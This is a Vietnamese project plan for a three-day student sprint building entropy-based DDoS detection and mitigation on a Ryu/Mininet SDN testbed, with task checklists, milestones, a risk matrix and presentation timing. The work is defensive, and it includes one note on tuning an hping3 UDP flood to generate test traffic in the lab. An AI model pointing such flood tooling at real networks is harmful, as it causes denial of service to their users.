🟪 [TV5] Task 5.9 — Dry-run (D3 Tối)
[ ] Bước 1. Buổi 1: cả nhóm chạy thử full 60', ghi phản hồi.
[ ] Bước 2. Sửa slide theo phản hồi.
[ ] Bước 3. Buổi 2: chạy bản ngắn 40' (theo §G).
[ ] Bước 4. Mỗi TV biết slot + thời gian + câu Q&A khả dĩ.
🟧 [TV1] Task 1.6 — Code review tổng (D3 Tối)  [recurring → 1 lần cuối]
[ ] Bước 1. Pull tất cả branch, list PR.
[ ] Bước 2. Mỗi module mới kiểm 3 điểm: docstring cite paper? ngưỡng trùng ATTACK_SIGNATURES.md? có file test?
[ ] Bước 3. Ghi docs/review/final.md:
## Final review (TV1 — D3)
- entropy.py: ✅ OK
- signature_matcher.py: ⚠ thiếu cite B4 — comment PR #12
- mitigation.py: ❓ rate-limit chưa có test → tag TV4

✅ Cuối D3 — Mốc M_D3 (Hoàn tất sprint)
[ ] alert_system.py + detector.py orchestrator chạy E2E (TV3 3.5).
[ ] Dashboard 5 trang /, /api/stats, /alerts, /flows, manual block + video slides/demo_dashboard.mp4 (TV1 1.9 C+D+E+F).
[ ] Integration test E2E s01 pass — detect ≤ 3s + flow drop verify (TV5 5.3).
[ ] BlacklistManager TTL + auto-release (TV4 4.6).
[ ] Harness run_scenario.py chạy đủ 8 kịch bản (TV5 5.4).
[ ] benchmark_mitigation.csv + fig (TV4 4.7).
[ ] 24 file JSON + results_raw.json (TV5 5.5).
[ ] thresholds.yaml từ grid search + flash-crowd guard, TPR≥92%, FPR≤5%, s08 không alert (TV3 3.6).
[ ] policy.yaml 3 cấp đã verify (TV4 4.8).
[ ] metrics.py + benchmark.csv 8 dòng + 3 figs (TV1 1.10).
[ ] 4 figs TV5 + 2 figs TV1 = 6 figs 300dpi tại results/figs/ (TV5 5.6).
[ ] stress_report.md ×2/×5/×10 + ngưỡng drop (TV5 5.7).
[ ] docs/FINAL_REPORT.pdf IEEE 8 chương + ≥ 12 references (TV1 1.7+1.8).
[ ] slides/main.tex 30 slide + slides/demo_backup.mp4 (TV5 5.8).
[ ] 2 buổi dry-run, slide chốt, mỗi TV biết slot + Q&A (TV5 5.9).
[ ] docs/review/final.md (TV1 1.6).

🧾 §D–§G — Phụ lục bám theo timeline
§D.1 Lịch họp (3 ngày)
Loại
Khi
Chủ trì
Standup (15')
Đầu mỗi ca Sáng D1/D2/D3
TV1
Sync nhanh (10')
Đầu mỗi ca Trưa/Chiều/Tối
TV1
Review chung (30')
Cuối D1, cuối D2
TV1 + TV5
Dry-run (60')
D3 Tối (×2)
Cả nhóm

§D.2 Ma trận rủi ro 3 ngày
Rủi ro
XS
TĐ
Phương án
Ryu/Mininet lỗi version
TB
Cao
TV2 chốt setup.sh D1 Sáng, mọi TV chạy chung
FPR cao ở flash crowd
Cao
TB
Kết hợp nhiều feature (TV3 Task 3.6)
Ngưỡng không tổng quát
Cao
Cao
Grid search 70/30 train/test
Mitigation chặn nhầm DNS
TB
Cao
Whitelist (TV4 Task 4.6)
TV vắng đột xuất
TB
TB
Sprint dày → cần backup pair-up giữa TV2/TV4, TV3/TV5
Demo live fail
Thấp
Cao
Video demo dự phòng (TV5 5.8)
Self-DoS controller
TB
Cao
Fix punt-to-controller (TV4 Task 4.2c)
Sprint 3 ngày quá tải
Cao
Cao
Dùng song song tối đa, mỗi TV phải hoàn thành đúng ca; nếu trễ → cắt scope theo §G

§D.3 Definition of Done chung (mỗi task)
✅ Code + unit test pass cục bộ
✅ Commit theo [TVx] <module>: <mô tả>
✅ Có docstring cite paper (nếu là detection/mitigation)
✅ TV1 review + TV5 integration-test
✅ Cập nhật CHANGELOG.md
§F.3 Cảnh báo kỹ thuật xuyên suốt
OpenFlow 1.3 BẮT BUỘC cho Meter Table — khai báo cả ở topology (protocols='OpenFlow13') và Ryu app (OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]).
TCLink bw=10Mbps: UDP flood hping3 chỉ ~12k pps đã saturate — chỉnh --flood thành -i u100 để có thể đo dải.
InfluxDB phải chạy trước Ryu — nếu không router chạy nhưng mất dashboard.
Whitelist gateway (10.0.x.1) — code cũ loại trừ trong flow_stats_reply_handler nhưng KHÔNG loại trừ trong _monitor_entropy. Cần thống nhất (TV4).
WINDOW_SIZE=1000 chu kỳ 3s — traffic thấp có thể không đủ 100 gói trigger entropy → TV3 baseline động + cảnh báo "insufficient data".
Non-whitelist self-DoS controller — code cũ punt mọi gói → fix bằng flow tạm idle_timeout=5s + OFPActionOutput(CONTROLLER, max_len=128) (TV4 Task 4.2c).
§G — Phương án rút thuyết trình xuống 40' (nếu sprint 3 ngày trễ)
Phần
60'
40'
1+2 (TV1 Intro + Theory)
10'
6' (gộp slide khảo sát)
3 (TV2 Topology)
8'
5' (bỏ so sánh V3/V4)
4 (TV3 Detection)
10'
7'
5 (TV4 Mitigation)
8'
5' (bỏ graduated response)
6 (TV5 Demo + KQ)
10'
8' (chỉ chạy 1 kịch bản, không 3)
7 (TV1 Kết luận)
3'
2'
Q&A
10'
7'

Quy tắc slide chung
Mỗi slide ≤ 30 chữ + 1 hình.
Slide có code: ≤ 15 dòng, highlight phần quan trọng.
Slide kết quả: bảng TPR/FPR + 1 biểu đồ entropy timeline đẹp nhất.
Video demo backup 3' (TV5) phòng live fail.

Ghi chú cuối: Mô hình 3-day sprint nén lại từ kế hoạch 6 tuần — toàn bộ 43 task được phân bổ qua 12 ca (4 ca/ngày × 3 ngày). Phương pháp dựa trên entropy + thống kê kinh điển (Shannon 1948, Page 1954 CUSUM, Lakhina 2005), đủ đạt TPR ≥92% mà không cần ML. Nếu sprint trễ → cắt scope theo §G.

